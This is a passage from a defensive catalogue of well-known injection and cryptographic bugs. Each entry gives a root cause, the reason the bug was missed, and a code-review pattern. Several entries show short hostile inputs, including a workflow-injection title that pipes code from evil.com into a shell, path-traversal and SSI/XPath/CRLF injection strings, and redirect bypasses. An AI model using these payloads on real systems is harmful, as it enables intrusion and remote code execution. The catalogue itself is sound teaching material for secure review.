seems like a style choice.
**Review Pattern:** TEMPLATE_DATA_SEPARATION — "Is user input passed as a template variable
(data), or concatenated into the template string (code)? These are fundamentally different."

### I5. npm Dependency Confusion — npm/PyPI/Maven
**Project:** npm, PyPI, Maven Central | **Severity:** Critical | **Discovered:** 2021
**The Bug:** Alex Birsan discovered that private package names could be registered on public
registries. Package managers would prefer the public registry version (often with a higher
version number), causing internal builds to pull malicious packages from public sources.
**Root Cause:** Package managers used a fallback resolution strategy: check private registry,
then fall back to public registry, preferring the highest version across both. This meant
a public package with a high version number could override a private package.
**Why Missed:** The resolution behavior was documented but its security implications weren't
analyzed. Each registry worked correctly; the vulnerability emerged from the interaction
between private and public resolution.
**Review Pattern:** DEPENDENCY_RESOLUTION — "Can an attacker register package names on a
public registry that match internal/private packages? Is the package manager configured to
use only the intended registry for each scope/namespace?"

### I6. GitHub Actions Workflow Injection — GitHub (ongoing pattern)
**Project:** GitHub Actions / various | **Severity:** Critical | **Discovered:** Ongoing
**The Bug:** GitHub Actions workflows using `${{ }}` expression syntax in `run:` blocks
perform string interpolation before shell execution. Attacker-controlled values (issue
titles, PR bodies, branch names) containing shell metacharacters can inject commands:
```yaml
# Vulnerable:
run: echo "${{ github.event.issue.title }}"
# If title is: "; curl evil.com | sh; echo "
```
**Root Cause:** The `${{ }}` syntax performs textual substitution before the shell sees the
command. There is no escaping — the value is spliced directly into the shell command.
**Why Missed:** The workflow syntax looks like variable interpolation (safe), but it's
actually macro expansion (unsafe). The distinction between `${{ }}` (unsafe) and `$VAR`
(safe) isn't obvious from the syntax.
**Review Pattern:** CI_MACRO_EXPANSION — "Do CI/CD workflow templates use macro expansion
with attacker-controllable inputs? Treat `${{ github.event.* }}` as equivalent to
unescaped shell interpolation."

### I7. LDAP Injection — Various applications
**Project:** Various | **Severity:** High | **Discovered:** Ongoing pattern
**The Bug:** LDAP queries constructed by string concatenation with user input, similar to
SQL injection. Characters like `*`, `(`, `)`, `\`, and null bytes can alter query logic.
**Root Cause:** LDAP doesn't have parameterized queries like SQL prepared statements. Filter
construction requires manual escaping of special characters.
**Why Missed:** LDAP injection is less well-known than SQL injection. Developers familiar
with SQL parameterization may not realize LDAP requires different sanitization.
**Review Pattern:** QUERY_CONSTRUCTION — "For every query language (SQL, LDAP, XPath, OGNL,
GraphQL), is user input either parameterized or properly escaped for that specific language?"

### I8. PHP Type Juggling — PHP (design pattern)
**Project:** PHP applications | **Severity:** High | **Discovered:** Ongoing pattern
**The Bug:** PHP's `==` operator performs type coercion that can bypass authentication:
```php
if ($hash == "0e12345") { ... }
// "0e12345" == "0e67890" is TRUE (both are scientific notation for 0)
// "0" == "" is TRUE in older PHP versions
```
**Root Cause:** PHP's loose comparison coerces strings to numbers when they look numeric.
Hash values starting with `0e` followed by digits are treated as zero in scientific
notation.
**Why Missed:** `==` is the "normal" comparison operator in most languages. The type
juggling behavior is PHP-specific and counterintuitive. Code using `==` looks correct to
reviewers not deeply familiar with PHP's comparison semantics.
**Review Pattern:** STRICT_COMPARISON — "In PHP: is every security-sensitive comparison
using `===` (strict) rather than `==` (loose)? In JavaScript: similar concerns with `==`."

### I9. Ruby on Rails Mass Assignment (CVE-2013-0156)
**Project:** Ruby on Rails | **Severity:** Critical | **Discovered:** 2013
**The Bug:** Rails' parameter parsing accepted XML and YAML in addition to form data. The
YAML parser could deserialize arbitrary Ruby objects, leading to remote code execution.
**Root Cause:** Rails auto-detected content type and used the corresponding parser. YAML
was included because it was a common Ruby serialization format, but its deserialization
was equivalent to code execution.
**Why Missed:** Content-type handling was a framework feature, not application code. The
YAML parser was "just another content type" in the framework's plugin architecture. The
connection between HTTP content-type negotiation and arbitrary code execution was non-obvious.
**Review Pattern:** CONTENT_TYPE_TRUST — "Does the application accept content types that
enable code execution (YAML, pickle, Java serialization)? Should content type negotiation
be restricted to known-safe formats?"

### I10. Regular Expression DoS (ReDoS) — Various
**Project:** Various (Node.js, Python, Ruby, Java) | **Severity:** Medium-High
**The Bug:** Regular expressions with nested quantifiers or overlapping alternatives can
exhibit exponential backtracking on certain inputs, causing CPU exhaustion:
```
/(a+)+$/.test("aaaaaaaaaaaaaaaaaaaaaaaa!")  // exponential time
```
**Root Cause:** NFA-based regex engines use backtracking, and certain patterns create
exponential branching. The regex looks simple but its computational cost can be O(2^n).
**Why Missed:** Regex performance is rarely considered during review. The patterns look
correct and work fine for normal inputs. The pathological behavior only manifests with
adversarial inputs.
**Review Pattern:** REGEX_COMPLEXITY — "Does any regex applied to user input contain nested
quantifiers (a+)+, overlapping alternatives (a|a+), or unbounded repetition applied to
complex groups? Use RE2/linear-time engines for untrusted input."

### I11-I40. Additional Injection Bugs

### I11. JavaScript Prototype Pollution — Various npm packages
**Project:** lodash, jQuery, minimist, and hundreds more | **Severity:** High
**The Bug:** Recursive merge/extend functions that don't exclude `__proto__`, `constructor`,
or `prototype` keys allow attackers to modify Object.prototype, affecting all objects:
```javascript
merge({}, JSON.parse('{"__proto__": {"admin": true}}'))
// Now ({}).admin === true for ALL objects
```
**Root Cause:** JavaScript's prototype chain means modifying Object.prototype affects every
object in the runtime. Deep merge functions that copy all keys without filtering allow this.
**Why Missed:** Deep merge is a common utility function. The `__proto__` property is a
language feature that most developers don't think about. The vulnerability is in the
language semantics, not in obviously wrong code.
**Review Pattern:** PROTOTYPE_KEYS — "Does any recursive object operation (merge, clone,
set-by-path) filter out `__proto__`, `constructor`, and `prototype` keys?"

### I12. Command Injection via child_process — Node.js
**Project:** Node.js applications | **Severity:** Critical
**The Bug:** Using `child_process.exec()` with string concatenation instead of
`child_process.execFile()` with argument arrays:
```javascript
exec(`convert ${filename} output.png`);  // vulnerable to shell injection
execFile('convert', [filename, 'output.png']);  // safe
```
**Root Cause:** `exec()` passes the command string to a shell, enabling metacharacter
injection. `execFile()` invokes the program directly without a shell.
**Why Missed:** Both functions are in the same module and have similar names. The
security difference is in the shell invocation, which isn't obvious from the API names.
**Review Pattern:** SHELL_AVOIDANCE — "Does process execution go through a shell (system,
exec, popen, backticks) or invoke the program directly (execvp, execFile, subprocess with
shell=False)? Prefer direct invocation."

### I13. SQL Injection via ORM Misuse — Various
**Project:** Various applications using ORMs | **Severity:** High
**The Bug:** Using raw SQL fragments within ORM queries, or passing user input to ORM
methods that accept raw expressions:
```python
User.objects.extra(where=["name = '%s'" % user_input])  # vulnerable
User.objects.filter(name=user_input)  # safe
```
**Root Cause:** ORMs provide escape hatches for raw SQL. When user input reaches these
escape hatches, the ORM's protection is bypassed.
**Why Missed:** "We use an ORM, so SQL injection is impossible" is a common misconception.
The ORM's raw query methods are less visible than direct SQL string construction.
**Review Pattern:** ORM_RAW_ESCAPE — "Does the ORM query use any raw SQL methods (extra,
raw, RawSQL, literal)? If so, is user input properly parameterized within those raw parts?"

### I14. Header Injection / Response Splitting — Various
**Project:** Various web frameworks | **Severity:** High
**The Bug:** Setting HTTP headers from user input without filtering CRLF characters:
```
Location: /redirect?url=\r\nSet-Cookie: admin=true
```
**Root Cause:** HTTP headers are delimited by CRLF. If user input containing `\r\n` is
placed in a header value, additional headers can be injected.
**Why Missed:** Modern frameworks mostly prevent this, but it still occurs in custom header
handling, redirect URLs, and cookie values built from user input.
**Review Pattern:** CRLF_IN_HEADERS — "Is any user input placed in HTTP headers? Does the
framework filter CRLF characters, or must the application do it?"

### I15. XSS via dangerouslySetInnerHTML — React
**Project:** React applications | **Severity:** High | **Discovered:** Ongoing
**The Bug:** React's `dangerouslySetInnerHTML` bypasses its built-in XSS protection. Any
user input passed through it is rendered as raw HTML.
**Root Cause:** React escapes all JSX expressions by default. `dangerouslySetInnerHTML` is
an explicit opt-out of this protection, and its name warns about the danger. But when
combined with server data that includes user input, the danger is real.
**Why Missed:** The data might not be "user input" directly — it might come from a CMS,
database, or API that itself contains user-generated content. The trust boundary is not at
the React component but further upstream.
**Review Pattern:** HTML_INJECTION_CHAIN — "When rendering raw HTML, trace the data back to
its origin. Even if the immediate source is 'trusted' (API, database), does that source
contain user-generated content?"

### I16. CSRF in REST APIs — Various
**Project:** Various REST API frameworks | **Severity:** Medium-High
**The Bug:** APIs that rely on cookies for authentication without CSRF tokens are vulnerable
to cross-site request forgery. A malicious page can make authenticated requests by having
the browser attach the session cookie.
**Root Cause:** "REST APIs don't need CSRF protection" is a misconception when cookies are
used. Browser same-origin policy prevents reading responses but not sending requests.
**Why Missed:** CSRF protection is associated with HTML forms, not APIs. Developers assume
APIs are called only by their own frontend or by other services, not by browsers.
**Review Pattern:** COOKIE_AUTH_CSRF — "If authentication uses cookies (including JWTs in
cookies), is CSRF protection applied? SameSite cookies help but aren't sufficient alone."

### I17. JWT Algorithm None Attack — Various
**Project:** Various JWT implementations | **Severity:** Critical
**The Bug:** Some JWT libraries accepted tokens with `"alg": "none"`, meaning no signature
verification was performed. An attacker could forge arbitrary tokens.
**Root Cause:** The JWT spec defines `"none"` as a valid algorithm. Libraries implementing
the full spec without restricting algorithms would accept unsigned tokens.
**Why Missed:** The code correctly implemented the JWT specification. The vulnerability is
in the specification itself (or rather, in using the full spec without restrictions).
**Review Pattern:** JWT_ALGORITHM_RESTRICT — "Is the JWT verification configured with an
explicit allowlist of algorithms? Does it reject 'none', and does it prevent RSA/HMAC
confusion (accepting an RSA public key as an HMAC secret)?"

### I18. Open Redirect — Various web frameworks
**Project:** Various | **Severity:** Medium
**The Bug:** Redirect endpoints that accept arbitrary URLs without validating they point
to the same application: `/login?redirect=//evil.com` or `/login?redirect=\/evil.com`.
**Root Cause:** URL validation is harder than it appears. Many bypass techniques exist:
`//evil.com`, `\/evil.com`, `http://app.com@evil.com`, `java​script:alert(1)`.
**Why Missed:** Simple URL checks (starts with `/`) are bypassable. The variety of bypass
techniques means any incomplete validation creates a false sense of security.
**Review Pattern:** REDIRECT_VALIDATION — "For any redirect that takes a URL parameter: is
it validated against an allowlist of hosts? Path-only validation is insufficient."

### I19. HTTP Request Smuggling — Various proxy/server combinations
**Project:** nginx/Apache + Node/Gunicorn/Puma | **Severity:** High
**The Bug:** Differences in how frontend and backend servers parse HTTP requests (especially
Transfer-Encoding vs Content-Length disagreements) allow attackers to "smuggle" a second
request inside the body of the first.
**Root Cause:** The HTTP/1.1 spec has ambiguities around chunked encoding edge cases. When
two servers disagree on where a request ends, the remainder is interpreted as the start of
a new request — potentially with a different user's credentials.
**Why Missed:** Each server's HTTP parser is internally correct. The vulnerability only
exists when two parsers disagree, and testing typically uses a single server configuration.
**Review Pattern:** HTTP_PARSING_STRICT — "Does the HTTP parser/server reject ambiguous
requests (multiple Content-Length, conflicting Transfer-Encoding, malformed chunks)?"

### I20. Format String Vulnerabilities — C/C++ applications
**Project:** Various C/C++ projects | **Severity:** High-Critical
**The Bug:** Passing user-controlled strings as format strings to printf-family functions:
```c
printf(user_input);  // vulnerable: user can use %x, %n, etc.
printf("%s", user_input);  // safe: user input is a parameter
```
**Root Cause:** printf interprets `%` sequences as format specifiers. `%x` leaks stack
data; `%n` writes to memory. User-controlled format strings allow both information
disclosure and arbitrary writes.
**Why Missed:** `printf(variable)` compiles and works correctly for normal inputs. The
compiler doesn't always warn about non-literal format strings (though modern GCC/Clang do
with -Wformat-security).
**Review Pattern:** FORMAT_STRING — "Is any printf/sprintf/syslog/fprintf call using a
variable as the format string? The format string must always be a compile-time literal."

### I21. Path Traversal in File Upload — Various web applications
**Project:** Various | **Severity:** High
**The Bug:** File upload handlers that use the client-provided filename to construct the
storage path without sanitizing directory traversal sequences:
```python
path = os.path.join(UPLOAD_DIR, request.files['file'].filename)
# filename could be "../../../etc/cron.d/backdoor"
```
**Root Cause:** The filename comes from the client and can contain `../` sequences.
`os.path.join` with an absolute component may discard the base directory entirely.
**Why Missed:** `os.path.join` looks like it handles path safety, but it doesn't prevent
traversal. The filename appears to be "just a name" but is actually a relative path.
**Review Pattern:** FILENAME_SANITIZE — "Is any client-provided filename used in filesystem
operations? Strip directory components, validate against an allowlist of characters, and
verify the final resolved path is within the intended directory."

### I22. YAML Deserialization RCE — Various languages
**Project:** PyYAML, SnakeYAML, ruby YAML | **Severity:** Critical
**The Bug:** YAML parsers in several languages can instantiate arbitrary objects during
deserialization. PyYAML's `yaml.load()` (without Loader=SafeLoader) executes arbitrary
Python code via the `!!python/object/apply:` tag.
**Root Cause:** The YAML spec includes tags for language-specific types. Libraries
implementing the full spec allow instantiation of arbitrary types from untrusted input.
**Why Missed:** YAML is perceived as a simple data format (like JSON). The ability to
instantiate objects is a spec feature that most users aren't aware of.
**Review Pattern:** YAML_SAFE_LOAD — "Is YAML loading using safe mode (SafeLoader in
Python, safe_load)? Any YAML parser that supports language-specific tags is a code
execution risk."

### I23-I40. Additional Input Handling Bugs

### I23. OAuth Redirect URI Validation Bypass — Various
**Project:** Various OAuth implementations | **Severity:** High
**The Bug:** Incomplete redirect_uri validation allowing token theft via open redirects,
subdomain takeover, or path confusion.
**Root Cause:** OAuth providers performing prefix-matching, subdomain-matching, or path-
only matching instead of exact URI matching for redirect_uri validation.
**Review Pattern:** OAUTH_REDIRECT_EXACT — "Is OAuth redirect_uri validated with exact
string matching, including scheme, host, port, and path?"

### I24. CSV Injection / Formula Injection — Various
**Project:** Various web applications exporting CSV | **Severity:** Medium
**The Bug:** Cells starting with `=`, `+`, `-`, `@` are interpreted as formulas by
spreadsheet applications, potentially executing commands.
**Review Pattern:** CSV_ESCAPE — "Does CSV export prefix formula-triggering characters with
a single quote or tab to prevent formula injection?"

### I25. Unicode Normalization Bypass — Various
**Project:** Various applications | **Severity:** Medium-High
**The Bug:** Input validation before Unicode normalization allows bypass. For example,
filtering `<script>` but then normalizing Unicode fullwidth characters `＜script＞` to
their ASCII equivalents.
**Review Pattern:** NORMALIZE_THEN_VALIDATE — "Is input validation performed AFTER Unicode
normalization and encoding conversion, not before?"

### I26. Null Byte Injection — C-backed languages (PHP, old Python)
**Project:** PHP applications, old Python | **Severity:** High
**The Bug:** C-backed file operations truncate at null bytes while the scripting language
sees the full string: `open("file.php\x00.jpg")` passes `.jpg` extension check but opens
`file.php` in C.
**Review Pattern:** NULL_BYTE — "For languages with C-backed I/O, can null bytes in user
input truncate strings at the system call level?"

### I27. HTTP Parameter Pollution — Various
**Project:** Various web frameworks | **Severity:** Medium
**The Bug:** Different frameworks handle duplicate HTTP parameters differently (first, last,
array). Attackers exploit this when a WAF and application use different resolution rules.
**Review Pattern:** PARAM_UNIQUENESS — "How does the application handle duplicate HTTP
parameters? Does the WAF/proxy handle them the same way?"

### I28. Host Header Injection — Various
**Project:** Various web frameworks | **Severity:** Medium-High
**The Bug:** Applications trusting the Host header for URL generation (password reset links,
redirects) allow attackers to control the host in generated URLs.
**Review Pattern:** HOST_TRUST — "Is the Host header used to generate URLs or make routing
decisions? Use a configured server name, not the request header."

### I29. Clickjacking — Various web applications
**Project:** Various | **Severity:** Medium
**The Bug:** Applications without X-Frame-Options or CSP frame-ancestors headers can be
embedded in malicious iframes, tricking users into clicking hidden elements.
**Review Pattern:** FRAMING_PROTECTION — "Does the application set X-Frame-Options: DENY
or CSP frame-ancestors 'self'?"

### I30. Insecure Direct Object Reference (IDOR) — Various
**Project:** Various web APIs | **Severity:** High
**The Bug:** API endpoints that accept user-supplied IDs without checking authorization:
`/api/users/123/documents` returns documents for user 123 regardless of who's asking.
**Review Pattern:** OBJECT_AUTH — "For every endpoint that accepts an object ID, is there
an authorization check verifying the requesting user has access to that specific object?"

### I31. Mass Assignment via API — Various REST frameworks
**Project:** Rails, Django REST, Spring | **Severity:** High
**The Bug:** API endpoints that bind all request fields to model attributes allow setting
admin flags, user IDs, or other privileged fields via extra parameters in requests.
**Review Pattern:** FIELD_ALLOWLIST — "Does the API endpoint use an explicit allowlist of
fields that can be set via request parameters?"

### I32. GraphQL Introspection Exposure — Various
**Project:** Various GraphQL APIs | **Severity:** Medium
**The Bug:** GraphQL introspection queries exposing internal schema, types, and field names
in production environments.
**Review Pattern:** INTROSPECTION_PROD — "Is GraphQL introspection disabled in production?
Are query depth and complexity limits enforced?"

### I33. Race Condition in Token Validation — Various
**Project:** Various web applications | **Severity:** Medium-High
**The Bug:** One-time tokens (password reset, email verification) that aren't invalidated
atomically, allowing reuse within a narrow time window.
**Review Pattern:** TOKEN_ATOMICITY — "Is one-time token validation and invalidation atomic?
Can a token be used concurrently before the first use completes?"

### I34. Email Header Injection — Various
**Project:** Various applications with email functionality | **Severity:** Medium
**The Bug:** User input in email headers (To, Subject, CC) without CRLF filtering,
allowing additional headers or recipients to be injected.
**Review Pattern:** EMAIL_HEADERS — "Is user input in email headers filtered for CRLF
characters?"

### I35. Server-Side Include (SSI) Injection — Various
**Project:** Various web servers/applications | **Severity:** High
**The Bug:** User input placed in HTML pages served by web servers with SSI enabled can
execute server-side directives: `<!--#exec cmd="ls" -->`.
**Review Pattern:** SSI_CHECK — "If the web server supports SSI, is user input sanitized
to prevent SSI directive injection?"

### I36. XPath Injection — Various
**Project:** Various applications using XML/XPath | **Severity:** High
**The Bug:** XPath queries constructed from user input without parameterization, similar
to SQL injection: `//user[name='$input']` where input can be `' or '1'='1`.
**Review Pattern:** XPATH_PARAM — "Are XPath queries using parameterized variables or
proper escaping for user input?"

### I37. WebSocket Cross-Site Hijacking — Various
**Project:** Various WebSocket applications | **Severity:** High
**The Bug:** WebSocket endpoints that rely on cookies for auth without checking the Origin
header, allowing cross-site WebSocket connections.
**Review Pattern:** WEBSOCKET_ORIGIN — "Does the WebSocket handshake validate the Origin
header?"

### I38. HTML Injection via Markdown — Various
**Project:** GitHub, GitLab, various Markdown renderers | **Severity:** Medium
**The Bug:** Markdown renderers that allow raw HTML or insufficient sanitization of
rendered output, enabling XSS through markdown content.
**Review Pattern:** MARKDOWN_SANITIZE — "Does the Markdown renderer sanitize HTML output?
Is raw HTML allowed in Markdown input?"

### I39. DNS Rebinding — Various
**Project:** Various local services, development tools | **Severity:** High
**The Bug:** Services bound to localhost that don't validate the Host header are vulnerable
to DNS rebinding — an attacker's domain initially resolves to the attacker's server, then
changes to 127.0.0.1 after CORS/same-origin checks pass.
**Review Pattern:** DNS_REBINDING — "Does the localhost-bound service validate the Host
header to prevent DNS rebinding attacks?"

### I40. CRLF Injection in Logs — Various
**Project:** Various applications | **Severity:** Medium
**The Bug:** Log injection via CRLF characters in user input, allowing attackers to forge
log entries, obscure attacks, or inject ANSI escape sequences.
**Review Pattern:** LOG_INJECTION — "Is user input in log messages sanitized for newlines
and control characters?"

---

## Cryptographic Failures (25 entries)

### C1. Debian OpenSSL PRNG Disaster (CVE-2008-0166)
**Project:** Debian OpenSSL | **Severity:** Critical | **Discovered:** 2008 (present since 2006)
**The Bug:** A Debian maintainer commented out two lines in OpenSSL's random number
generator to silence Valgrind/Purify warnings. These lines were responsible for adding
entropy to the PRNG. The only remaining "random" input was the process ID (max 32,768).
**Root Cause:** The maintainer saw Valgrind warnings about "use of uninitialized data" and
removed the offending lines. But the uninitialized data WAS the entropy source — using
uninitialized memory as randomness was intentional. The fix turned cryptographic random
numbers into an easily-brutable 15-bit keyspace.
**Why Missed:** The change was discussed on the openssl-dev mailing list, but no one caught
its implications. It appeared to be a minor cleanup fixing tool warnings, not a security
change. The OpenSSL team didn't review the patch carefully, and the Debian maintainer
didn't understand the cryptographic significance.
**Review Pattern:** ENTROPY_SOURCE — "Does any change affect random number generation? Are
entropy sources identified and protected? Never 'fix' entropy-related warnings without
understanding why the code uses uninitialized/random data."

### C2. Apple goto fail (CVE-2014-1266)
**Project:** Apple SecureTransport | **Severity:** Critical | **Discovered:** 2014
**The Bug:** A duplicated `goto fail;` statement caused SSL/TLS signature verification to
always succeed:
```c
if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
    goto fail;
    goto fail;  // This always executes, skipping verification below
if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)
    goto fail;
```
**Root Cause:** The second `goto fail;` was not inside an if-block. Due to the lack of
braces, it executed unconditionally, jumping to the cleanup code before the signature
verification completed. The `err` variable was 0 (success) from the previous check.
**Why Missed:** The code was in a deeply nested chain of if-statements without braces. The
duplicate line looked like a copy-paste artifact. Without braces, the indentation was
misleading about control flow. The function was long and repetitive.
**Review Pattern:** BRACE_DISCIPLINE — "In C/C++/ObjC: do if/else/for/while blocks use
braces, even for single statements? Without braces, indentation-based reading of control
flow is unreliable."

### C3. POODLE (CVE-2014-3566)
**Project:** SSL 3.0 / Various implementations | **Severity:** Medium-High
**The Bug:** The SSL 3.0 padding scheme for CBC ciphers doesn't specify padding content,
only the padding length. An attacker can modify padding bytes without detection, enabling
a padding oracle attack that decrypts one byte at a time.
**Root Cause:** The SSL 3.0 specification itself is flawed — it explicitly states that
padding content is not checked, only the length byte. Implementations correctly following
the spec are inherently vulnerable.
**Why Missed:** This is a protocol-level vulnerability, not an implementation bug.
Implementations were correct per the specification. The vulnerability was in the
specification itself.
**Review Pattern:** PROTOCOL_VERSION — "Does the system support deprecated/weak protocol
versions (SSL 3.0, TLS 1.0/1.1) that have known protocol-level vulnerabilities?"

### C4. DROWN (CVE-2016-0800)
**Project:** OpenSSL / SSLv2 | **Severity:** High | **Discovered:** 2016
**The Bug:** Servers supporting SSLv2 (even if only for legacy compatibility) exposed their
RSA private keys to a cross-protocol attack. SSLv2's weak key exchange could be attacked to
recover the RSA private key, which was shared with TLS connections.
**Root Cause:** Supporting SSLv2 even alongside modern TLS was dangerous because the
protocols shared the same RSA key pair. SSLv2's weak export ciphers could be attacked to
extract the key.
**Why Missed:** The servers were "only" supporting SSLv2 for backward compatibility, and
administrators believed that as long as clients used modern TLS, they were safe. The cross-
protocol attack wasn't obvious.
**Review Pattern:** LEGACY_PROTOCOL_RISK — "Is a deprecated protocol version still enabled
'just for compatibility'? Even unused legacy protocols can create attack surface."

### C5. FREAK (CVE-2015-0204)
**Project:** OpenSSL, Apple SecureTransport | **Severity:** High
**The Bug:** TLS clients could be tricked into accepting export-grade RSA keys (512-bit)
even when neither client nor server intended to use export ciphers. A man-in-the-middle
could downgrade the connection.
**Root Cause:** The client's state machine accepted ServerKeyExchange messages with export-
grade parameters even when export ciphers hadn't been negotiated, and then used these weak
parameters for the key exchange.
**Why Missed:** Export ciphers were considered dead (disabled by default). The vulnerability
was in the state machine's handling of an unexpected message, not in the cipher negotiation
itself.
**Review Pattern:** UNEXPECTED_MESSAGE — "Does the protocol state machine correctly reject
messages that are valid in other states but unexpected in the current state?"

### C6. Bleichenbacher / ROBOT Attack — Various TLS
**Project:** Various TLS implementations | **Severity:** High | **Discovered:** 1998/2017
**The Bug:** RSA PKCS#1 v1.5 padding validation in TLS implementations leaked timing or
error information, enabling an adaptive chosen-ciphertext attack to decrypt RSA-encrypted
pre-master secrets.
**Root Cause:** Different error conditions (valid padding but wrong length, invalid padding,
valid everything) produced distinguishable responses — different error codes, different
timing, or different behavior.
**Why Missed:** The original Bleichenbacher attack was published in 1998 and "fixed" many
times, but implementations kept reintroducing timing side channels. The constant-time
requirement extends to EVERY branch in the padding check, which is extraordinarily
difficult to achieve in practice.
**Review Pattern:** CONSTANT_TIME — "Are all cryptographic operations on secret data
constant-time? This includes padding validation, MAC comparison, and key derivation.
Check for data-dependent branches, memory access patterns, and early returns."

### C7. Go crypto/elliptic P-521 Bug
**Project:** Go standard library | **Severity:** Medium
**The Bug:** The P-521 elliptic curve implementation had a carry propagation bug that
produced incorrect results for a small fraction of inputs, potentially leaking private key
bits through invalid signatures.
**Root Cause:** Carry propagation in multi-precision arithmetic for the P-521 field. The
field element representation used 9 limbs of 58 bits each for the 521-bit prime, and a
carry was lost in one operation.
**Why Missed:** The bug only manifested for approximately 1 in 2^58 inputs. Normal testing
would never encounter an affected input. The arithmetic code was dense and correct for
virtually all cases.
**Review Pattern:** CARRY_PROPAGATION — "In multi-precision arithmetic or custom big-number
implementations: does carry propagation handle all limb sizes correctly? Are there edge
cases near the field modulus?"

### C8-C25. Additional Cryptographic Bugs

### C8. Weak Key Generation — Debian OpenSSL Weak Keys (CVE-2008-0166 Aftermath)
**Project:** Debian / embedded devices | **Severity:** Critical | **Discovered:** 2008-ongoing
**Incident:** CVE-2008-0166 (Debian OpenSSL) generated only 32,768 possible keys; the
broader pattern of weak key generation on embedded devices was documented by Heninger et
al. (2012) in "Mining Your Ps and Qs," finding that 0.2% of all TLS hosts shared keys
**The Bug:** Multiple embedded devices using low-entropy boot-time randomness for key
generation, producing duplicate keys across devices. Following the Debian weak key
disaster (see C1), researchers Nadia Heninger et al. conducted a comprehensive 2012 study
scanning the entire IPv4 address space for TLS and SSH keys. They found that 0.2% of all
TLS hosts and 1% of SSH hosts had keys generated with insufficient entropy — producing
keys shared across multiple devices. Embedded devices (routers, firewalls, headless
servers) were the worst offenders because they generated keys early in the boot process
before sufficient entropy had accumulated. The study factored the RSA moduli of hosts
sharing one prime factor, recovering private keys for tens of thousands of devices.
**Why Missed:** Key generation happens once, at installation or first boot. The lack of
entropy is invisible — the generated key looks like a normal key. Only by comparing keys
across thousands of devices can the duplication be detected.
**Review Pattern:** BOOT_ENTROPY — "Is key generation deferred until sufficient entropy is
available? Does /dev/urandom block on boot before the entropy pool is initialized?"

### C9. ECB Mode Usage — Adobe Password Breach (2013)
**Project:** Adobe | **Severity:** Critical | **Discovered:** 2013
**Incident:** Adobe password database breach (2013) — 153 million user records encrypted
with 3DES in ECB mode, allowing password analysis without decryption
**The Bug:** Using ECB mode for block cipher encryption, which doesn't hide patterns in
plaintext. In 2013, attackers breached Adobe and leaked a database of 153 million user
records. Instead of hashing passwords, Adobe had encrypted them with 3DES in ECB mode
using a single key for all users. Because ECB encrypts identical plaintext blocks to
identical ciphertext blocks, users with the same password had identical encrypted values.
Researchers could immediately identify the most common passwords by frequency analysis
(the most common ciphertext corresponded to "123456"). Combined with the plaintext
password hints stored alongside the encrypted passwords, researchers created crossword-
puzzle-style analyses that revealed passwords at scale without ever decrypting them. The
"Adobe crossword" demonstrated that ECB mode preserves patterns in ways that render
encryption nearly useless for data at rest.
**Why Missed:** The system "encrypted passwords" — which sounds secure. The choice of ECB
mode (vs. CBC or CTR) is a parameter that seems like an implementation detail. Developers
without cryptographic training may not understand why the mode matters.
**Review Pattern:** BLOCK_CIPHER_MODE — "Is the block cipher mode appropriate? ECB is
almost never correct. Use authenticated encryption (GCM, ChaCha20-Poly1305)."

### C10. Static IVs and Nonces — PS3 ECDSA Nonce Reuse (2010)
**Project:** Sony PlayStation 3 | **Severity:** Critical | **Discovered:** 2010
**Incident:** fail0verflow (2010) — Sony used the same ECDSA nonce for every firmware
signature, allowing complete private key recovery and enabling arbitrary code execution
on PS3
**The Bug:** Reusing initialization vectors or nonces with stream ciphers or CTR mode,
destroying confidentiality (nonce reuse with ECDSA is similarly catastrophic, revealing
the private key). Sony's PS3 firmware signing used ECDSA, which requires a unique random
nonce for each signature. Sony's implementation used a static value instead of a random
nonce — the same "random" number for every signature. With two signatures using the same
nonce, basic algebra recovers the private signing key. The fail0verflow team presented
this at the 27th Chaos Communication Congress (27C3), demonstrating that anyone could now
sign code as Sony, completely breaking the PS3's code signing security. The talk's slide
showing the static nonce became one of the most famous images in cryptographic failure
history.
**Why Missed:** The signing code "worked" — it produced valid ECDSA signatures that
verified correctly. The nonce reuse is invisible from the output unless you compare
multiple signatures. The developer may not have understood that the nonce MUST be random
for each signature (not just unique, but unpredictable).
**Review Pattern:** NONCE_UNIQUENESS — "Is a fresh IV/nonce generated for every encryption
operation? For GCM, nonce reuse is catastrophic."

### C11. MAC-then-Encrypt — Lucky Thirteen (CVE-2013-0169)
**Project:** OpenSSL, GnuTLS, NSS, and other TLS implementations | **Severity:** Medium-High | **Discovered:** 2013
**Incident:** CVE-2013-0169 (Lucky Thirteen) — a timing attack against TLS's MAC-then-
encrypt construction in CBC mode, affecting virtually all TLS implementations
**The Bug:** Using MAC-then-encrypt construction, which is vulnerable to padding oracle
attacks. Lucky Thirteen exploited a timing side channel in TLS's CBC mode implementation:
the time to process a record varied depending on whether the padding was valid, because
the MAC computation processed different amounts of data depending on the padding length.
By measuring the timing difference (approximately 2 microseconds), an attacker could
determine whether a modified ciphertext had valid padding, enabling a padding oracle
attack that decrypted traffic one byte at a time. The attack was named "Lucky Thirteen"
because the TLS record header is 13 bytes, which plays a crucial role in the MAC
calculation that leaks timing information. Every major TLS implementation was affected.
**Why Missed:** The MAC-then-encrypt construction was specified in the TLS standard. The
timing difference was extremely small (microseconds). Making the processing truly
constant-time requires careful handling of every branch in the padding check and MAC
computation, including processing dummy data to normalize timing.
**Review Pattern:** AEAD_PREFERENCE — "Is the system using authenticated encryption (AEAD)
rather than separate encrypt + MAC? AEAD modes prevent padding oracle attacks."

### C12. Timing Side Channels in String Comparison — Keyczar Timing Attack (2009)
**Project:** Google Keyczar | **Severity:** Medium-High | **Discovered:** 2009
**Incident:** Nate Lawson's 2009 demonstration of practical timing attacks against Google's
Keyczar cryptographic library and other implementations using standard string comparison
for MAC verification
**The Bug:** Using standard string comparison (==, strcmp, equals) for MAC/hash/token
verification, leaking information about which byte differs first. In 2009, security
researcher Nate Lawson demonstrated practical remote timing attacks against cryptographic
MAC verification. Google's Keyczar library used Java's `Arrays.equals()` for comparing
HMAC values, which returns false at the first byte difference. By measuring response
times, an attacker could determine how many leading bytes of their forged MAC matched
the correct value, then brute-force the MAC one byte at a time (256 attempts per byte
instead of 256^N total). Lawson showed this was practical even over the network with
statistical analysis of timing data. The attack reduced HMAC forgery from computationally
infeasible to trivially practical.
**Why Missed:** `Arrays.equals()` (or `==` in Python, `strcmp` in C) is the "normal" way
to compare values. The early-exit optimization that makes it fast also makes it insecure
for cryptographic comparisons. The timing difference per byte is nanoseconds, which seems
too small to exploit — but statistics make it practical.
